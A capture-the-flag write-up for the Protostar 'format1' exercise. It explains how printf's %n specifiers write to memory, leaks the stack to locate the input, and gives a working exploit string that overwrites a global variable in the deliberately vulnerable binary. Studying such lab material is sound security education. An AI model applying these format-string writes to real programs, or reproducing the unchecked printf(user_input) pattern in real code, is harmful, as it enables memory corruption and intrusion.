# Format 1

## Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
  printf(string);                                   // <- format string vulnerability
  
  if(target) {
      printf("you have modified the target :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

## Overview & Idea

- In this challenge `target` was initialized in global, so it's not located on stack. But we see that in `vuln` function, the program can be exploit by format string vulnerability. We'll use format string to make some change to `target`. And then if `target != 0` we can go into true branch of if statement :3. Let's do it!

## Detail

### Special Specifier

- `%n` is used for overwrite to content of specific address. To simplify, let's check this example:

```c
// This code means write to 0xbffffd49 with value is size of format (except %n), here is "%n", so size is 0 bytes.
printf("%n", 0xbffffd49);
// But we can use "%[number]x%n" to write number into address we passed as argument.
```
- I also write this example code that can make this easier to understand
```C
#include<stdio.h>

int main()
{
	int cookie = 0;
	printf("&cookie: %p\n", &cookie);

    // Print the 8 bytes start at cookie's address
	for ( int i = 0 ; i < 8 ; i++ )
	{
		printf("%d ", *(((unsigned char*)(&cookie)) + i) );
	}
	printf("\n");

	// Overwrite 12 to cookie (I passed 0 before &cookie to feed the %12x, if not, we must use %1$n to specify the argument we want)
	printf("%12x%n", 0, &cookie);
    // This code has the same functionality %1$n specify the index of argument which we'll use to pass for this specifier
    // It's necessary because if doesn't have 1$, specifier automatically uses next argument, which has index 2, and where's index 2? It's content of stack
    printf("%12x%1$n", &cookie); 

	// Check the cookie's value after use %n specifier
	printf("\ncookie = %x\n", cookie);

	// Print the 8 bytes start at cookie's address
	for ( int i = 0 ; i < 8 ; i++ )
	{
		printf("%d ", *(((unsigned char*)(&cookie)) + i) );
	}
	printf("\n");

	return 0;
}
```
- **Result**:
```
λ /mnt/c/users/whatd/Desktop/CTF/pwn/format_string/taose/ gcc -m32 -no-pie vuln.c -o vuln
λ /mnt/c/users/whatd/Desktop/CTF/pwn/format_string/taose/ ./vuln
&cookie: 0xffffd4a4
0 0 0 0 124 213 255 255
           0
cookie = c
12 0 0 0 4 0 0 0
```

- The different between `%n`, `%hn`, `%hhn` is `%n` affects to 4 bytes start at given address, while `%hn` affects 2 bytes and `%hhn` affects 1 byte.

- So we can use this technique to overwrite a value to specific address. Let's change the direction of program!

- First, we must know the address of buffer to find index on stack to implement overwrite on

```
root@protostar:/opt/protostar/bin# (python -c 'print("AAAABBBB"+".%x"*400)') | xargs ./format1
AAAABBBB.804960c.bffff818.8048469.b7fd8304.b7fd7ff4.bffff818.8048435.bffff9e8.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff898.b7eadc76.2.bffff8c4.bffff8d0.b7fe1848.bffff880.ffffffff.b7ffeff4.804824d.1.bffff880.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff898.c5af0e50.efe73840.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff8c4.8048450.8048440.b7ff1040.bffff8bc.b7fff8f8.2.bffff9de.bffff9e8.0.bffffea1.bffffeb5.bffffec5.bffffee7.bffffefa.bfffff04.bfffff18.bfffff5a.bfffff71.bfffff82.bfffff8a.bfffff95.bfffffa2.bfffffd8.bfffffe9.0.20.b7fe2414.21.b7fe2000.10.f8bfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.0.c.0.d.0.e.0.17.0.19.bffff9bb.1f.bffffff2.f.bffff9cb.0.0.0.0.44000000.a710c210.51979d2f.47c2a51a.698714fd.363836.0.0.0.2f2e0000.6d726f66.317461.41414141.42424242 ....
```

- After that, we leaked the stack and by some simple code python, I found the index is 129

- The address of target is 0x8049638

```
0x080483f4 <vuln+0>:    push   ebp
0x080483f5 <vuln+1>:    mov    ebp,esp
0x080483f7 <vuln+3>:    sub    esp,0x18
0x080483fa <vuln+6>:    mov    eax,DWORD PTR [ebp+0x8]
0x080483fd <vuln+9>:    mov    DWORD PTR [esp],eax
0x08048400 <vuln+12>:   call   0x8048320 <printf@plt>
0x08048405 <vuln+17>:   mov    eax,ds:0x8049638                <- address of target
---------------------------------------------------
0x0804840a <vuln+22>:   test   eax,eax                         <- condition's statement
---------------------------------------------------
0x0804840c <vuln+24>:   je     0x804841a <vuln+38>
0x0804840e <vuln+26>:   mov    DWORD PTR [esp],0x8048500
0x08048415 <vuln+33>:   call   0x8048330 <puts@plt>
0x0804841a <vuln+38>:   leave
0x0804841b <vuln+39>:   ret
```

## Exploit

- AAAABB is padding for align input purpose.
```
root@protostar:/opt/protostar/bin# (python -c 'print("AAAABB\x38\x96\x04\x08CC"+"%129$n")') | xargs ./format1
AAAABB8�CCyou have modified the target :)
```